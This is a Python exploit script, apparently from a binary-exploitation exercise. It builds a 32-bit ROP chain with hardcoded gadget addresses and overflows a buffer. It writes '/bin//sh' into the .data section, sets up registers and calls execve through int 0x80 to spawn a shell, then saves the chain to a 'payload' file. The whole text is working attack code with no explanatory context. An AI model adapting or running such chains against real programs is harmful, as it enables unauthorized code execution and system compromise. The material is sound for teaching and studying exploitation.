from struct import pack
data = 0x080e5020
xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
xor_edx_edx = 0x0807b179 # xor edx, edx ; mov eax, edx ; ret
pop_eax = 0x080ac76a # pop eax ; ret
pop_ebx = 0x08049022 # pop ebx ; ret
pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
pop_edx = 0x0808b285 # pop edx ; xor eax, eax ; pop edi ; ret
inc_eax = 0x0809d0ae # inc eax ; ret
int_80 = 0x080499b2 # int 0x80
mov_edx_eax = 0x08080742 # mov dword ptr [edx], eax ; ret
filler = 0x11111111

p = bytes('AAAA' * 4 + 'BBBB' * 1, 'ascii') # Padding + EBP
 
# write /bin at .data
p += pack('<I', pop_edx)
p += pack('<I', data)
p += pack('<I', filler)
p += pack('<I', pop_eax)
p += bytes('/bin', 'ascii')
p += pack('<I', mov_edx_eax)
# write //sh at .data + 4
p += pack('<I', pop_edx)
p += pack('<I', data + 4)
p += pack('<I', filler)
p += pack('<I', pop_eax)
p += bytes('//sh', 'ascii')
p += pack('<I', mov_edx_eax)
# \0 at .data + 8
p += pack('<I', pop_edx)
p += pack('<I', data + 8)
p += pack('<I', filler)
p += pack('<I', xor_eax_eax)
p += pack('<I', mov_edx_eax)
# write address of string that points to program into ebx
p += pack('<I', pop_ebx)
p += pack('<I', data)
# write arguments into ecx
p += pack('<I', pop_ecx)
p += pack('<I', data + 8)
# write environment into edx
p += pack('<I', xor_edx_edx)
# set eax to 11
p += pack('<I', xor_eax_eax)
for _ in range(11):
    p += pack('<I', inc_eax)
# call interrupt
p += pack('<I', int_80)

print(str(p)[2:-1])

with open('payload', 'wb') as file:
    file.write(p)